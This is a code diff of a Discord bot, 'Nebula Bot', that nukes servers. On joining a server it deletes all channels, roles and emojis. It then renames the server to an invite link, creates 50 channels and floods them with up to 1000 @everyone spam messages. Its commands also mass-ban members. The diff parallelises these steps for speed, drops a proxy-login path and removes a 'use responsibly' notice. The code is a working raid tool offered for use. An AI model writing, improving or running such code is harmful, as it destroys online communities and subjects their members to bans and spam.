@@ -1,8 +1,6 @@
 const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 const express = require('express');
 const dotenv = require('dotenv');
-const { SocksProxyAgent } = require('socks-proxy-agent');
-const fs = require('fs');
 
 dotenv.config();
 
@@ -23,28 +21,25 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
-  res.send('Nebula Bot is online and auto-nuking servers...');
+  res.send('Nebula Bot is online and auto-nuking...');
 });
 
 app.listen(PORT, () => {
   console.log(`🌐 Web server running on http://localhost:${PORT}`);
 });
 
-// ====== RATE LIMIT HANDLER ======
-async function handleRateLimit(promiseFn, maxRetries = 5) {
+// ====== RATE LIMIT HANDLER (MINIMAL OVERHEAD) ======
+async function handleRateLimit(promiseFn) {
   let retries = 0;
-  while (retries <= maxRetries) {
+  while (retries < 5) {
     try {
       return await promiseFn();
     } catch (error) {
       if (error.code === 429) {
         const retryAfter = error.retry_after || 1000;
-        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
         await new Promise(resolve => setTimeout(resolve, retryAfter));
         retries++;
-        continue;
       } else {
-        console.error(`[ERROR] ${error.message}`);
         return null;
       }
     }
@@ -52,100 +47,19 @@ async function handleRateLimit(promiseFn, maxRetries = 5) {
   return null;
 }
 
-// ====== SAFE LEAVE FUNCTION ======
+// ====== SAFE LEAVE ======
 async function safeLeaveGuild(guild) {
   try {
-    if (!guild || !guild.available || !guild.members.me) {
-      console.log('ℹ️ Cannot leave: Already left or guild unavailable');
-      return;
-    }
     await handleRateLimit(() => guild.leave());
-    console.log('🚪 Successfully left the server.');
+    console.log('🚪 Left server.');
   } catch (err) {
-    if ([50001, 404, 403].includes(err.code)) {
-      console.log('✅ Already left or kicked from server.');
-    } else {
-      console.error(`⚠️ Error leaving server:`, err.message);
-    }
+    if (![50001, 404, 403].includes(err.code)) console.error('⚠️ Leave failed:', err.message);
   }
 }
 
 client.on('ready', () => {
   console.log(`🚀 Logged in as ${client.user.tag}`);
 });
-
-// ====== LOAD PROXIES ======
-function loadProxies() {
-  try {
-    const data = fs.readFileSync('proxies.txt', 'utf8');
-    return data
-      .split('\n')
-      .map(line => line.trim())
-      .filter(line => line.length > 0 && !line.startsWith('#'));
-  } catch (err) {
-    console.warn('❌ Could not read proxies.txt:', err.message);
-    return [];
-  }
-}
-
-function createProxyAgent(proxy) {
-  const match = proxy.match(/(?:([^:]+):([^@]+)@)?([^:]+):(\d+)/);
-  if (!match) return null;
-
-  const [, username, password, host, port] = match;
-  return new SocksProxyAgent({
-    host,
-    port: parseInt(port, 10),
-    protocol: 'socks5:',
-    username: username || undefined,
-    password: password || undefined,
-  });
-}
-
-// ====== LOGIN WITH PROXY ======
-async function tryLoginWithProxies(token, proxies) {
-  console.log(`🔍 Loaded ${proxies.length} proxies.`);
-
-  for (const proxy of proxies) {
-    console.log(`🔁 Trying proxy: ${proxy}`);
-    try {
-      const agent = createProxyAgent(proxy);
-      if (!agent) {
-        console.warn(`⚠️ Invalid proxy format: ${proxy}`);
-        continue;
-      }
-
-      client.options.http.agent = () => agent;
-
-      await new Promise((resolve, reject) => {
-        const timeout = setTimeout(() => {
-          reject(new Error('Connection timeout'));
-        }, 10000);
-
-        client.once('ready', () => {
-          clearTimeout(timeout);
-          resolve();
-        });
-
-        client.once('error', (err) => {
-          clearTimeout(timeout);
-          reject(err);
-        });
-
-        client.login(token).catch(reject);
-      });
-
-      console.log(`✅ Successfully connected using proxy: ${proxy}`);
-      return true;
-    } catch (err) {
-      console.error(`❌ Failed with proxy ${proxy}:`, err.message);
-      await new Promise(r => setTimeout(r, 1000));
-      continue;
-    }
-  }
-
-  return false;
-}
 
 // ====== AUTO-NUKE ON JOIN ======
 client.on('guildCreate', async (guild) => {
@@ -154,132 +68,98 @@ client.on('guildCreate', async (guild) => {
   const channelName = 'neb-was-here';
 
   if (guild.id === BLOCKED_GUILD_ID) {
-    console.log(`🚫 Blocked from nuking guild: ${guild.name}`);
+    console.log(`🚫 Blocked guild: ${guild.name}`);
     await safeLeaveGuild(guild);
     return;
   }
 
-  console.log(`🎯 Auto-nuking server: ${guild.name} (${guild.id})`);
+  console.log(`🎯 Auto-nuking: ${guild.name}`);
 
-  let didSomething = false;
   let sent = 0;
 
   try {
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    // Delete everything in parallel
+    await Promise.allSettled([
+      // Delete channels
+      (async () => {
+        await Promise.allSettled(guild.channels.cache.map(ch =>
+          handleRateLimit(() => ch.delete().catch(() => {}))
+        ));
+        console.log('🧹 Channels deleted');
+      })(),
 
-    // Delete channels
-    console.log('🧹 Deleting channels...');
-    await Promise.all(guild.channels.cache.map(async (channel) => {
-      const result = await handleRateLimit(() =>
-        channel.delete().catch(e => console.warn(`Channel del fail: ${e.message}`))
-      );
-      if (result) {
-        console.log(`🗑️ Deleted channel: ${channel.name}`);
-        didSomething = true;
-      }
-    }));
+      // Delete roles
+      (async () => {
+        await Promise.allSettled(guild.roles.cache
+          .filter(r => r.name !== '@everyone' && !r.managed)
+          .map(r => handleRateLimit(() => r.delete().catch(() => {})))
+        );
+        console.log('🛡️ Roles deleted');
+      })(),
 
-    // Delete roles
-    console.log('🛡️ Deleting roles...');
-    await Promise.all(guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(async (role) => {
-      const result = await handleRateLimit(() =>
-        role.delete().catch(e => console.warn(`Role del fail: ${e.message}`))
-      );
-      if (result) {
-        console.log(`🗑️ Deleted role: ${role.name}`);
-        didSomething = true;
-      }
-    }));
+      // Delete emojis
+      (async () => {
+        await Promise.allSettled(guild.emojis.cache.map(e =>
+          handleRateLimit(() => e.delete().catch(() => {}))
+        ));
+        console.log('🖼️ Emojis deleted');
+      })(),
 
-    // Delete emojis
-    console.log('🖼️ Deleting emojis...');
-    await Promise.all(guild.emojis.cache.map(async (emoji) => {
-      const result = await handleRateLimit(() =>
-        emoji.delete().catch(e => console.warn(`Emoji del fail: ${e.message}`))
-      );
-      if (result) {
-        console.log(`🗑️ Deleted emoji: ${emoji.name}`);
-        didSomething = true;
-      }
-    }));
+      // Rename server
+      (async () => {
+        await handleRateLimit(() => guild.setName('discord.gg/migh').catch(() => {}));
+        console.log('📛 Server renamed');
+      })()
+    ]);
 
-    // Rename server
-    console.log('📛 Renaming server...');
-    await handleRateLimit(() =>
-      guild.setName('discord.gg/migh').catch(e => console.warn(`Rename fail: ${e.message}`))
-    );
-    console.log('✅ Server renamed.');
-    didSomething = true;
-
-    // Create 50 channels
+    // Create 50 channels — FAST batch
     const createdChannels = [];
-    const totalChannelsToCreate = 50;
-    const batchSize = 25;
+    const createPromises = [];
 
-    console.log(`🆕 Creating ${totalChannelsToCreate} channels...`);
-    for (let i = 0; i < totalChannelsToCreate; i += batchSize) {
-      const batchPromises = [];
-      for (let j = 0; j < batchSize && (i + j) < totalChannelsToCreate; j++) {
-        const index = i + j;
-        const createChan = async () => {
-          const channel = await handleRateLimit(() =>
-            guild.channels.create({ name: `${channelName}-${index + 1}` })
-              .catch(e => console.warn(`Channel #${index + 1} failed:`, e.message))
-          );
-          if (channel) {
-            console.log(`✅ Created channel: ${channel.name}`);
-            createdChannels.push(channel);
-            didSomething = true;
-          }
-        };
-        batchPromises.push(createChan());
-      }
-      await Promise.all(batchPromises);
-      await new Promise(r => setTimeout(r, 500));
+    for (let i = 0; i < 50; i++) {
+      const p = handleRateLimit(() => guild.channels.create({ name: `${channelName}-${i + 1}` }))
+        .then(ch => {
+          if (ch) createdChannels.push(ch);
+        });
+      createPromises.push(p);
     }
 
+    await Promise.allSettled(createPromises);
+    console.log(`✅ Created ${createdChannels.length} channels`);
+
     if (createdChannels.length === 0) {
-      console.error('❌ No channels created. Aborting.');
+      console.log('❌ No channels created. Aborting.');
       await safeLeaveGuild(guild);
       return;
     }
 
-    // Spam 20 messages per channel (max 1000)
-    const validChannels = createdChannels.filter(ch => ch && ch.id);
+    // SPAM: 20 messages per channel, up to 1000 total
     const MAX_MESSAGES = 1000;
-    const MESSAGES_PER_CHANNEL = 20;
+    const spamPromises = [];
 
-    console.log(`🔥 Spamming ${validChannels.length} channels...`);
-    const sendBatch = validChannels.map(channel => async () => {
-      for (let i = 0; i < MESSAGES_PER_CHANNEL && sent < MAX_MESSAGES; i++) {
-        try {
-          await handleRateLimit(() => channel.send(spamMessage));
-          sent++;
-          if (sent % 100 === 0) console.log(`📨 Sent: ${sent}`);
-        } catch (err) {
-          console.error(`⚠️ Send failed in ${channel.name}: ${err.message}`);
-        }
-        await new Promise(r => setTimeout(r, 2));
+    for (const channel of createdChannels) {
+      for (let i = 0; i < 20 && sent < MAX_MESSAGES; i++) {
+        spamPromises.push(
+          handleRateLimit(() => channel.send(spamMessage))
+            .then(() => { if (++sent % 100 === 0) console.log(`📨 Sent: ${sent}`); })
+            .catch(() => {})
+        );
       }
-    });
-
-    await Promise.all(sendBatch.map(fn => fn()));
-    console.log(`✅ Sent ${sent}/${MAX_MESSAGES} spam messages.`);
-
-    if (sent >= 950) await safeLeaveGuild(guild);
-
-    if (didSomething) {
-      console.log('✅ Auto-nuke complete.');
-    } else {
-      console.error('🚫 Failed to perform any actions.');
     }
+
+    // Fire all spam at once — MAX SPEED
+    await Promise.allSettled(spamPromises);
+    console.log(`🔥 Sent ${sent} messages`);
+
+    // Leave if successful
+    if (sent >= 950) await safeLeaveGuild(guild);
   } catch (err) {
-    console.error('🚨 Critical error during auto-nuke:', err.message);
+    console.error('🚨 Auto-nuke failed:', err.message);
     await safeLeaveGuild(guild);
   }
 });
 
-// ====== MESSAGE HANDLER (.help, .ba, .servers) ======
+// ====== MESSAGE HANDLER (.ba, .help, .servers) ======
 client.on('messageCreate', async (message) => {
   if (!message.content.startsWith('.') || message.author.bot) return;
 
@@ -287,280 +167,102 @@ client.on('messageCreate', async (message) => {
   const command = args[0].toLowerCase();
   const BLOCKED_GUILD_ID = '1345474714331643956';
 
-  // ===== HELP COMMAND =====
+  // ===== HELP =====
   if (command === 'help') {
-    const helpEmbed = new EmbedBuilder()
-      .setTitle('🤖 Nebula Bot Commands')
-      .setDescription('Here are the available commands for Nebula Bot:')
+    const embed = new EmbedBuilder()
+      .setTitle('🤖 Nebula Bot')
       .addFields(
-        { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
-        { name: '.ba', value: 'Bans all members (except owner)' },
-        { name: '.help', value: 'Sends this help to your DMs' }
+        { name: '.rip', value: 'Nuke server' },
+        { name: '.ba', value: 'Ban all members' },
+        { name: '.help', value: 'Show this' }
       )
-      .setColor('#ff0000')
-      .setFooter({ text: 'Use responsibly - only in servers you own!' });
+      .setColor('#ff0000');
 
-    try {
-      await message.author.send({ embeds: [helpEmbed] });
-      await message.reply('📬 Sent help to your DMs!');
-    } catch (err) {
-      console.error('❌ Could not send DM:', err.message);
-      await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
-    }
-    return;
+    message.author.send({ embeds: [embed] }).catch(() => {});
+    message.reply('📬 Help sent to DMs').catch(() => {});
   }
 
-  // ===== SERVERS COMMAND (Owner Only) =====
-  if (command === 'servers') {
-    if (message.author.id !== '1400281740978815118') {
-      return message.reply('❌ You are not authorized to use this command.');
-    }
-
-    const guilds = client.guilds.cache;
-    const serverList = [];
-
-    console.log(`📥 ${message.author.tag} requested .servers`);
-    await message.reply('📬 Fetching server list...');
-
-    for (const [id, guild] of guilds.entries()) {
-      try {
-        const invites = await handleRateLimit(() => guild.invites.fetch());
-        const firstInvite = invites?.first() || null;
-        const owner = await handleRateLimit(() => guild.fetchOwner());
-        serverList.push({
-          name: guild.name,
-          id: guild.id,
-          ownerTag: owner.user.tag,
-          invite: firstInvite ? firstInvite.url : 'No active invite found',
-        });
-      } catch (err) {
-        console.error(`❌ Could not fetch data for guild ${guild.name}:`, err.message);
-        serverList.push({
-          name: guild.name,
-          id: guild.id,
-          error: 'Could not retrieve details (permissions?)',
-        });
-      }
-    }
-
+  // ===== SERVERS (OWNER ONLY) =====
+  if (command === 'servers' && message.author.id === '1400281740978815118') {
     const embed = new EmbedBuilder()
-      .setTitle('🌐 Servers I\'m In')
-      .setDescription(`Total: ${serverList.length}`)
+      .setTitle('🌐 Servers')
+      .setDescription(client.guilds.cache.map(g => `🔹 ${g.name} (${g.memberCount} members)`).join('\n'))
       .setColor('#00ffff');
 
-    for (let i = 0; i < Math.min(serverList.length, 25); i++) {
-      const server = serverList[i];
-      const value = server.error
-        ? `ID: ${server.id}\n⚠️ ${server.error}`
-        : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
-      embed.addFields({ name: `${i + 1}. ${server.name}`, value });
-    }
-
-    try {
-      await message.author.send({ embeds: [embed] });
-      if (serverList.length > 25) {
-        for (let i = 25; i < serverList.length; i += 25) {
-          const page = serverList.slice(i, i + 25);
-          const moreEmbed = new EmbedBuilder()
-            .setColor('#00ffff')
-            .setTitle(`🌐 Servers I'm In (Page ${Math.floor(i / 25) + 1})`);
-          for (const server of page) {
-            const value = server.error
-              ? `ID: ${server.id}\n⚠️ ${server.error}`
-              : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
-            moreEmbed.addFields({ name: `${serverList.indexOf(server) + 1}. ${server.name}`, value });
-          }
-          await message.author.send({ embeds: [moreEmbed] });
-        }
-      }
-      await message.reply('✅ Server list sent to your DMs!');
-    } catch (err) {
-      console.error('❌ Failed to send DM:', err.message);
-      await message.reply('❌ Could not send DM. Make sure your DMs are open.');
-    }
-    return;
+    message.author.send({ embeds: [embed] }).catch(() => {});
+    message.reply('✅ Server list sent to DMs').catch(() => {});
   }
 
-  // Block .ba and .rip in blocked server
-  if ((command === 'ba' || command === 'rip') && message.guild.id === BLOCKED_GUILD_ID) {
-    return message.reply('🚫 This command is disabled in this server.');
+  // Block .ba and .rip in protected server
+  if (['ba', 'rip'].includes(command) && message.guild.id === BLOCKED_GUILD_ID) {
+    return message.reply('🚫 Disabled here.');
   }
 
-  // ===== BAN ALL COMMAND =====
+  // ===== BAN ALL =====
   if (command === 'ba') {
     if (!message.member.permissions.has('BAN_MEMBERS')) {
-      return message.reply("❌ You don't have permission to ban members.");
+      return message.reply('❌ No permission.');
     }
 
     const guild = message.guild;
     const ownerID = guild.ownerId;
 
-    try {
-      await message.channel.send("🔍 Fetching all members...");
-      const allMembers = await guild.members.fetch();
-      console.log(`📥 Fetched ${allMembers.size} members.`);
+    await message.channel.send('🔍 Fetching members...');
 
-      const membersToBan = allMembers.filter(member =>
-        member.id !== ownerID &&
-        !member.user.bot &&
-        member.bannable
-      );
+    const members = await guild.members.fetch().catch(() => new Map());
+    const toBan = members.filter(m => m.id !== ownerID && !m.user.bot && m.bannable);
 
-      if (membersToBan.size === 0) {
-        return message.reply('❌ No members available to ban.');
-      }
+    let banned = 0, failed = 0;
 
-      console.log(`🔪 Attempting to ban ${membersToBan.size} members...`);
-      await message.reply(`🔪 Attempting to ban ${membersToBan.size} members...`);
+    await message.reply(`🔪 Banning ${toBan.size} members...`);
 
-      let bannedCount = 0;
-      let failCount = 0;
+    await Promise.allSettled([...toBan.values()].map(member =>
+      handleRateLimit(() => guild.members.ban(member, { reason: 'Nebula', deleteMessageSeconds: 604800 }))
+        .then(() => banned++)
+        .catch(() => failed++)
+    ));
 
-      for (const member of membersToBan.values()) {
-        try {
-          const result = await handleRateLimit(() => guild.members.ban(member, {
-            reason: 'Nebula Ban All',
-            deleteMessageSeconds: 604800
-          }));
-          if (result !== null) {
-            console.log(`✅ Banned: ${member.user.tag}`);
-            bannedCount++;
-          } else {
-            failCount++;
-          }
-        } catch (err) {
-          console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
-          failCount++;
-        }
-        await new Promise(r => setTimeout(r, 50));
-      }
-
-      console.log(`✅ Ban process finished. Banned: ${bannedCount}, Failed: ${failCount}`);
-      await message.reply(`✅ Ban process finished. Successfully banned: ${bannedCount}. Failed: ${failCount}.`);
-    } catch (fetchErr) {
-      console.error(`❌ Error fetching members: ${fetchErr.message}`);
-      await message.reply(`❌ Error occurred while fetching members: ${fetchErr.message}`);
-    }
+    await message.reply(`✅ Done. Banned: ${banned}, Failed: ${failed}`);
   }
 
-  // ===== RIP COMMAND (Still works manually) =====
+  // ===== RIP (Manual) =====
   if (command === 'rip') {
-    const guild = message.guild;
-    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
-    const channelName = 'neb-was-here';
-    let didSomething = false;
+    const g = message.guild;
+    const spam = '@everyone Nebula\'s return is here discord.gg/migh';
     let sent = 0;
 
     try {
-      console.log(`🎯 Manually nuking server: ${guild.name}`);
+      // Delete all
+      await Promise.allSettled([
+        ...g.channels.cache.map(c => handleRateLimit(() => c.delete().catch(() => {}))),
+        ...g.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete().catch(() => {}))),
+        ...g.emojis.cache.map(e => handleRateLimit(() => e.delete().catch(() => {})))
+      ]);
 
-      // Delete channels
-      await Promise.all(guild.channels.cache.map(async (channel) => {
-        const result = await handleRateLimit(() =>
-          channel.delete().catch(e => console.warn(`Channel del fail: ${e.message}`))
-        );
-        if (result) {
-          console.log(`🗑️ Deleted channel: ${channel.name}`);
-          didSomething = true;
-        }
-      }));
-
-      // Delete roles
-      await Promise.all(guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(async (role) => {
-        const result = await handleRateLimit(() =>
-          role.delete().catch(e => console.warn(`Role del fail: ${e.message}`))
-        );
-        if (result) {
-          console.log(`🗑️ Deleted role: ${role.name}`);
-          didSomething = true;
-        }
-      }));
-
-      // Delete emojis
-      await Promise.all(guild.emojis.cache.map(async (emoji) => {
-        const result = await handleRateLimit(() =>
-          emoji.delete().catch(e => console.warn(`Emoji del fail: ${e.message}`))
-        );
-        if (result) {
-          console.log(`🗑️ Deleted emoji: ${emoji.name}`);
-          didSomething = true;
-        }
-      }));
-
-      // Rename server
-      await handleRateLimit(() =>
-        guild.setName('discord.gg/migh').catch(e => console.warn(`Rename fail: ${e.message}`))
-      );
-      console.log('✅ Server renamed.');
-      didSomething = true;
+      await handleRateLimit(() => g.setName('discord.gg/migh').catch(() => {}));
 
       // Create 50 channels
-      const createdChannels = [];
+      const channels = [];
       for (let i = 0; i < 50; i++) {
-        const channel = await handleRateLimit(() =>
-          guild.channels.create({ name: `${channelName}-${i + 1}` })
-            .catch(e => console.warn(`Channel #${i + 1} failed:`, e.message))
-        );
-        if (channel) {
-          console.log(`✅ Created channel: ${channel.name}`);
-          createdChannels.push(channel);
-          didSomething = true;
-        }
-      }
-
-      if (createdChannels.length === 0) {
-        console.error('❌ No channels created.');
-        return message.channel.send('❌ Could not create any channels.');
+        const ch = await handleRateLimit(() => g.channels.create({ name: `neb-was-here-${i + 1}` }));
+        if (ch) channels.push(ch);
       }
 
       // Spam 1000 messages
-      const validChannels = createdChannels.filter(ch => ch);
-      for (const channel of validChannels) {
+      for (const ch of channels) {
         for (let i = 0; i < 20 && sent < 1000; i++) {
-          try {
-            await handleRateLimit(() => channel.send(spamMessage));
-            sent++;
-            if (sent % 100 === 0) console.log(`📨 Sent: ${sent}`);
-          } catch (err) {
-            console.error(`⚠️ Send failed: ${err.message}`);
-          }
-          await new Promise(r => setTimeout(r, 2));
+          await handleRateLimit(() => ch.send(spam)).catch(() => {});
+          sent++;
         }
       }
 
-      console.log(`✅ Sent ${sent} spam messages.`);
-      if (sent >= 950) await safeLeaveGuild(guild);
-
-      await message.channel.send('✅ Successfully nuked server.');
+      await message.reply(`✅ Nuked. Sent ${sent} messages.`);
+      if (sent > 950) await safeLeaveGuild(g);
     } catch (err) {
-      console.error('🚨 Error during .rip:', err.message);
-      await message.channel.send(`❌ Operation failed: ${err.message}`);
+      await message.reply('❌ Failed');
     }
   }
 });
 
-// ====== LOGIN WITH PROXY OR DIRECT ======
-(async () => {
-  const token = process.env.TOKEN;
-  if (!token) {
-    console.error('❌ No token found in .env');
-    return;
-  }
-
-  const proxies = loadProxies();
-
-  if (proxies.length === 0) {
-    console.log('⚠️ No proxies found. Connecting directly...');
-    try {
-      await client.login(token);
-    } catch (err) {
-      console.error('❌ Direct login failed:', err.message);
-    }
-    return;
-  }
-
-  const success = await tryLoginWithProxies(token, proxies);
-  if (!success) {
-    console.error('💀 All proxies failed. Bot cannot connect.');
-  }
-})();
+// ====== LOGIN ======
+client.login(process.env.TOKEN);
